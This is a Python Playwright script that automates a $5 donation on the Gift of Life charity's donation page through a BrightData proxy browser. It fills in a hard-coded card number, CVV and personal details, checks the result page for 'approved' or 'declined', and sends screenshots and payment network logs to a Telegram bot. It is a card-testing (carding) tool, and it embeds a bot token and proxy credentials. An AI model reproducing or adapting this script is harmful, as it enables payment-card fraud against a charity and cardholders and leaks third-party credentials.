#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Debug v2 — Playwright + BrightData
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

CARD_NUMBER = "5178057879094972"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_NAME = "Wafa Bro"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS = "W356"
CITY = "Carifnia"
STATE = "CA"
ZIP = "90011"


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000]},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def try_fill(page, selectors, value, field_name):
    """جرّب عدة selectors لحد ما يلاقي واحد شغال"""
    for sel in selectors:
        try:
            el = page.locator(sel).first
            if el.count() > 0:
                el.fill(str(value), timeout=3000)
                return True, sel
        except:
            continue
    return False, None


def try_click(page, selectors, field_name):
    """جرّب عدة selectors للضغط"""
    for sel in selectors:
        try:
            el = page.locator(sel).first
            if el.count() > 0:
                el.click(timeout=3000)
                return True, sel
        except:
            continue
    return False, None


def try_select(page, selectors, value, field_name):
    """جرّب عدة selectors للـ select"""
    for sel in selectors:
        try:
            el = page.locator(sel).first
            if el.count() > 0:
                try:
                    el.select_option(value=value, timeout=3000)
                    return True, sel
                except:
                    try:
                        el.select_option(label=value, timeout=3000)
                        return True, sel
                    except:
                        continue
        except:
            continue
    return False, None


def run_debug():
    tg_msg("🚀 Gift of Life Debug v2 — Starting...")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    # STEP 1: Connect
    tg_msg("🔄 [1/9] Connecting...")
    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ [1/9] Connected")
    except Exception as e:
        tg_msg(f"❌ [1/9] Failed: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    network_log = []
    page.on("request", lambda req: network_log.append({
        "type": "request", "url": req.url, "method": req.method, "post_data": req.post_data
    }))
    page.on("response", lambda res: network_log.append({
        "type": "response", "url": res.url, "status": res.status
    }))

    # STEP 2: Open Page
    tg_msg("🔄 [2/9] Opening page...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(5)
        tg_msg(f"✅ [2/9] Loaded: {page.title()[:60]}")
    except Exception as e:
        tg_msg(f"❌ [2/9] Failed: {str(e)[:200]}")
        return

    # STEP 3: Extract ALL form fields + buttons
    tg_msg("🔄 [3/9] Extracting ALL fields...")
    try:
        form_info = page.evaluate("""() => {
            const result = { inputs: [], selects: [], buttons: [], checkboxes: [], radios: [] };
            
            document.querySelectorAll('input').forEach(el => {
                result.inputs.push({
                    id: el.id || '',
                    name: el.name || '',
                    type: el.type || '',
                    placeholder: el.placeholder || '',
                    value: el.value || ''
                });
            });
            
            document.querySelectorAll('select').forEach(el => {
                result.selects.push({
                    id: el.id || '',
                    name: el.name || '',
                    options: Array.from(el.options).map(o => o.value).slice(0, 10)
                });
            });
            
            document.querySelectorAll('button').forEach(el => {
                result.buttons.push({
                    id: el.id || '',
                    type: el.type || '',
                    text: (el.innerText || '').trim().slice(0, 40),
                    class: el.className || ''
                });
            });
            
            document.querySelectorAll('input[type=checkbox]').forEach(el => {
                result.checkboxes.push({
                    id: el.id || '',
                    name: el.name || '',
                    value: el.value || ''
                });
            });
            
            document.querySelectorAll('input[type=radio]').forEach(el => {
                result.radios.push({
                    id: el.id || '',
                    name: el.name || '',
                    value: el.value || ''
                });
            });
            
            return result;
        }""")
        
        # ابعت الأقسام
        for section, items in form_info.items():
            if items:
                txt = json.dumps(items, indent=1, ensure_ascii=False)
                for i in range(0, len(txt), 3500):
                    tg_msg(f"📋 {section.upper()} ({i//3500+1}):\n<pre>{txt[i:i+3500]}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ [3/9] Extract failed: {str(e)[:200]}")

    # STEP 4: Select "Other" amount
    tg_msg("🔄 [4/9] Selecting 'Other' amount...")
    try:
        # اضغط on "Other" radio
        ok, sel = try_click(page, [
            "input[value='other']", "input[value='Other']",
            "#amount-other", "input[name='amount'][value='other']",
            "label:has-text('Other')",
            "text=Other",
        ], "Other")
        
        if ok:
            tg_msg(f"✅ [4/9] 'Other' clicked via: {sel}")
            time.sleep(1)
            
            # ادخل 5
            filled, fsel = try_fill(page, [
                "#other-amount", "input[name='other_amount']",
                "input[name='custom_amount']", "input[name='amount_other']",
                "input[placeholder*='amount']", "input[placeholder*='Amount']",
                "input[type='number']",
            ], "5.00", "Amount")
            
            if filled:
                tg_msg(f"✅ [4/9] Amount filled via: {fsel}")
            else:
                tg_msg("⚠️ [4/9] Amount field not found")
        else:
            tg_msg("⚠️ [4/9] 'Other' radio not found, trying direct fill")
            # جرّب تدخل 5 مباشرة
            filled, fsel = try_fill(page, [
                "#amount", "input[name='amount']", "input[name='donation_amount']",
            ], "5", "Amount")
            if filled:
                tg_msg(f"✅ [4/9] Amount direct filled via: {fsel}")
    except Exception as e:
        tg_msg(f"⚠️ [4/9] {str(e)[:150]}")

    # STEP 5: Fill About You
    tg_msg("🔄 [5/9] Filling About You...")
    filled_fields = []
    
    for field_name, value, selectors in [
        ("First Name", FIRST_NAME, [
            "#first-name", "#firstName", "#firstname",
            "input[name='first_name']", "input[name='firstName']",
            "input[id*='first']", "input[placeholder*='First']"
        ]),
        ("Last Name", LAST_NAME, [
            "#last-name", "#lastName", "#lastname",
            "input[name='last_name']", "input[name='lastName']",
            "input[id*='last']", "input[placeholder*='Last']"
        ]),
        ("Email", EMAIL, [
            "#email", "input[name='email']", "input[type='email']",
            "input[id*='email']", "input[placeholder*='mail']"
        ]),
        ("Phone", PHONE, [
            "#phone", "input[name='phone']", "input[type='tel']",
            "input[id*='phone']", "input[placeholder*='Phone']"
        ]),
        ("Address", ADDRESS, [
            "#address", "input[name='address']", "input[name='address1']",
            "input[id*='address']", "input[placeholder*='Address']"
        ]),
        ("City", CITY, [
            "#city", "input[name='city']",
            "input[id*='city']", "input[placeholder*='City']"
        ]),
        ("Zip", ZIP, [
            "#zip", "#postal", "input[name='zip']", "input[name='postal_code']",
            "input[id*='zip']", "input[id*='postal']", "input[placeholder*='Zip']", "input[placeholder*='Postal']"
        ]),
    ]:
        ok, sel = try_fill(page, selectors, value, field_name)
        if ok:
            filled_fields.append(f"✅ {field_name}: {sel}")
        else:
            filled_fields.append(f"❌ {field_name}: NOT FOUND")
    
    tg_msg("📝 Field Fills:\n" + "\n".join(filled_fields))

    # State select
    ok, sel = try_select(page, [
        "#state", "select[name='state']", "select[id*='state']",
        "select[name='province']"
    ], STATE, "State")
    if ok:
        tg_msg(f"✅ State selected: {sel}")

    # STEP 6: Fill Card Info
    tg_msg("🔄 [6/9] Filling Card Info...")
    card_fields = []
    
    for field_name, value, selectors in [
        ("Card Number", CARD_NUMBER, [
            "#card-number", "#cardNumber", "#cc-number", "#ccNumber",
            "#card_number", "input[name='card_number']", "input[name='cardNumber']",
            "input[id*='card'][id*='number']", "input[placeholder*='Card Number']",
            "input[autocomplete='cc-number']"
        ]),
        ("Card Name", CARD_NAME, [
            "#card-name", "#cardName", "#cc-name", "#ccName",
            "#card_holder", "input[name='card_name']", "input[name='cardName']",
            "input[id*='card'][id*='name']", "input[placeholder*='Name on Card']",
            "input[autocomplete='cc-name']"
        ]),
        ("CVV", CARD_CVV, [
            "#cvv", "#cvc", "#cc-cvv", "#ccCvv", "#card-cvv",
            "input[name='cvv']", "input[name='cvc']", "input[name='card_cvv']",
            "input[id*='cvv']", "input[id*='cvc']", "input[autocomplete='cc-csc']"
        ]),
        ("Month", CARD_MONTH, [
            "#month", "#card-month", "#cc-month", "#exp-month",
            "input[name='month']", "input[name='exp_month']", "input[name='card_month']",
            "input[id*='month']", "input[autocomplete='cc-exp-month']"
        ]),
        ("Year", CARD_YEAR, [
            "#year", "#card-year", "#cc-year", "#exp-year",
            "input[name='year']", "input[name='exp_year']", "input[name='card_year']",
            "input[id*='year']", "input[autocomplete='cc-exp-year']"
        ]),
    ]:
        ok, sel = try_fill(page, selectors, value, field_name)
        if ok:
            card_fields.append(f"✅ {field_name}: {sel}")
        else:
            card_fields.append(f"❌ {field_name}: NOT FOUND")
    
    tg_msg("💳 Card Fills:\n" + "\n".join(card_fields))

    # STEP 7: Check "Cover processing fee"
    tg_msg("🔄 [7/9] Checking 'Cover processing fee'...")
    try:
        ok, sel = try_click(page, [
            "input[name*='cover']", "input[id*='cover']",
            "input[name*='processing_fee']", "input[id*='processing_fee']",
            "input[type='checkbox'][name*='fee']",
            "input[type='checkbox'][id*='fee']",
            "label:has-text('cover the processing fee')",
            "label:has-text('processing fee')",
        ], "Cover Fee")
        if ok:
            tg_msg(f"✅ [7/9] Checkbox clicked: {sel}")
        else:
            tg_msg("⚠️ [7/9] Cover fee checkbox not found")
    except Exception as e:
        tg_msg(f"⚠️ [7/9] {str(e)[:100]}")

    # Screenshot before submit
    try:
        page.screenshot(path="/tmp/before_submit.png", full_page=True)
        tg_photo("/tmp/before_submit.png", "📸 Before Submit")
    except:
        pass

    # STEP 8: Submit
    tg_msg("🔄 [8/9] Submitting...")
    try:
        ok, sel = try_click(page, [
            "button[type='submit']", "input[type='submit']",
            "button:has-text('Submit')", "button:has-text('Donate')",
            "button:has-text('Continue')", "#submit", "#donate-button",
            "input[value='Submit']", "input[value='Donate']",
        ], "Submit")
        if ok:
            tg_msg(f"✅ [8/9] Submitted via: {sel}")
        else:
            tg_msg("❌ [8/9] Submit button not found")
    except Exception as e:
        tg_msg(f"❌ [8/9] {str(e)[:150]}")

    time.sleep(5)

    # Look for Continue
    tg_msg("🔄 Waiting for Continue popup...")
    for _ in range(15):
        try:
            ok, sel = try_click(page, [
                "button:has-text('Continue')",
                "input[value='Continue']",
                "button:has-text('CONTINUE')",
                "a:has-text('Continue')",
            ], "Continue")
            if ok:
                tg_msg(f"✅ Continue clicked via: {sel}")
                time.sleep(5)
                break
        except:
            pass
        time.sleep(1)

    # STEP 9: Read Result
    tg_msg("🔄 [9/9] Reading result...")
    time.sleep(10)

    try:
        body_text = page.inner_text("body")
        page_url = page.url

        # Search for result
        result_line = ""
        for line in body_text.split("\n"):
            line_s = line.strip()
            if any(k in line_s.upper() for k in ["REJECT", "SUCCESS", "ERROR", "DECLINED", "APPROVED", "CHARGE"]):
                result_line = line_s
                break

        # Search for errors
        if not result_line:
            for line in body_text.split("\n"):
                if any(k in line.lower() for k in ["reject", "declined", "error", "limit", "insufficient"]):
                    result_line = line.strip()
                    break

        tg_msg(f"""📊 RESULT:
━━━━━━━━━━━━━━━━━━━
🔗 URL: {page_url[:80]}
📝 Result: {result_line or 'No clear result'}
━━━━━━━━━━━━━━━━━━━""")

        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result Page")

    except Exception as e:
        tg_msg(f"⚠️ Read failed: {str(e)[:100]}")

    # Send Network Log
    tg_msg("📡 Sending Network Log...")
    important = []
    for entry in network_log:
        url = entry.get("url", "").lower()
        if any(k in url for k in ["payment", "charge", "donate", "card", "transaction", "api", "submit", "process", "authorize"]):
            important.append(entry)

    if important:
        log_text = json.dumps(important[:30], indent=2, ensure_ascii=False)
        for i in range(0, len(log_text), 3500):
            tg_msg(f"📡 Network ({i//3500+1}):\n<pre>{log_text[i:i+3500]}</pre>")
    else:
        tg_msg("⚠️ No important requests captured")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run_debug()
    except Exception as e:
        err = f"❌ FATAL:\n{e}\n\n{traceback.format_exc()}"
        print(err, flush=True)
        tg_msg(err[:3900])
